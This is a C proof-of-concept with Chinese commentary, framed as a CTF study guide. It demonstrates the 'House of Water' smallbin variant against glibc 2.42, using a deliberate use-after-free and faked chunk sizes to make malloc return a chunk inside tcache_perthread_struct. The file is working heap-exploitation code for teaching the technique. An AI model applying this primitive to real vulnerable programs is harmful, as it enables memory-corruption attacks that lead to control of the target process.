/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_water
 * 文件标注范围：2.42
 * 模拟漏洞：一次 UAF 或 double free，用来控制 tcache 元数据附近伪造出来
 *   的一个 fake chunk。
 * 核心流程：把 tcache_perthread_struct 里 counts（计数数组）和 entries
 *   （链表头数组）附近的字节拼成一个 fake chunk，借助 unsorted bin 的
 *   链表操作在不泄露任何地址的前提下把它接入进来，最终拿到对 tcache 本身
 *   的控制权。
 * 成功判据：PoC 同时验证了在不泄露地址的情况下把 libc/unsorted 指针接入
 *   tcache，以及让 malloc 精确返回任意目标地址这两点；2.42、2.43 的元
 *   数据布局有变化，各自用独立的 PoC 验证。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/*
 * House of Water 把 UAF/double-free 转化为对 tcache_perthread_struct 的
 * 控制原语。这里采用改进的 smallbin 变体：伪 chunk 靠 smallbin 的双向
 * 链表被引入，不需要在 tcache 元数据内部另外伪造一个 size 字段；即使没有
 * “按 1 递增数值”这种精确写入能力，也不用再爆破地址的低 4 位。变体说明：
 * https://github.com/4f3rg4n/CTF-Events-Writeups/blob/main/Potluck-CTF-2023/House_Of_Water_Smallbin_Variant.md
 *
 * 核心布局如下：
 * 1. 把 mid 放在 tcache 元数据之后，使它与元数据中的目标伪块
 *    共享可预测的地址低半字节；
 * 2. 通过两次带伪造 size 的 free，让两个大尺寸 tcache entry 分别记录下
 *    指向 first 与 last chunk header 的指针；这两个字后面会
 *    被 smallbin 解释成 fake chunk 的 fd 与 bk；
 * 3. 依次把 last、mid、first 送入 unsorted，再用
 *    大请求把三者整理成同一个 smallbin 双链；
 * 4. 用 UAF 覆盖 first->fd 与 last->bk 的低位，把链表两端同时
 *    重定向到 tcache 元数据内的 fake chunk；
 * 5. 清空 0x90 tcache 后连续分配，先取走两端的真实块，最后让 malloc 返回
 *    tcache 元数据内部的伪块，这样就能直接读写 counts/entries 了。
 *
 * 2.42 与 2.43 的 tcache_perthread_struct 尺寸和 entry 偏移都发生了变化，
 * 所以各自需要一套独立的堆风水和 bin 尺寸常量；不过攻击思路和上面这套
 * 双链闭合的过程并没有变。
 * 原始技术作者：@udp_ctf（Water Paddler / Blue Water）；
 * smallbin 变体作者：@4f3rg4n（CyberEGGs）。
 */

int main(void) {
	// 关闭 stdio 缓冲，避免 _IO_FILE 隐式的堆分配打乱 tcache 元数据附近的布局。
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	// 2.42 先做一次 0x4e0 的申请，把 tcache_perthread_struct 稳定地推到页内偏移 0x4f0 处，省去对地址低 4 位的爆破。
	malloc(0x4e0);

	// 三个 0x90 chunk 之间用保护块隔开，避免 free 时合并。
	void *mid = malloc(0x88);
	malloc(0x18);
	void *first = malloc(0x88);
	malloc(0x18);
	void *last = malloc(0x88);
	malloc(0x18);

	void *tcache = (void *)((long)mid & ~0xfff) + 0x490;
	void *fill[7];
	for (int i = 0; i < 7; i++) {
		fill[i] = malloc(0x88);
	}
	for (int i = 0; i < 7; i++) {
		free(fill[i]);
	}

	// 伪造两个大 chunk，使它们的 tcache entry 成为伪 smallbin 的 fd/bk。
	*(long *)(first - 0x18) = 0x321;
	free(first - 0x10);
	*(long *)(first - 0x8) = 0x91;
	*(long *)(last - 0x18) = 0x311;
	free(last - 0x10);
	*(long *)(last - 0x8) = 0x91;

	// 三块进入 unsorted bin 后，大请求把它们整理进同一条 smallbin。
	free(last);
	free(mid);
	free(first);
	malloc(0x700);

	// UAF：把 smallbin 两端都改到 tcache 元数据中的伪块。
	void *page = (void*)((long)tcache & ~0xfff);
	*(unsigned long *)first = (unsigned long)(page + 0x700);
	*(unsigned long *)(last + 0x8) = (unsigned long)(page + 0x700);

	// 先清空 tcache，再取走两个真实节点，第三次必须返回伪块。
	for(int i = 0; i < 7; i++)
		malloc(0x88);
	malloc(0x88);
	malloc(0x88);
	void *p = malloc(0x88);
	assert(p == tcache + 0x280);
	return 0;
}
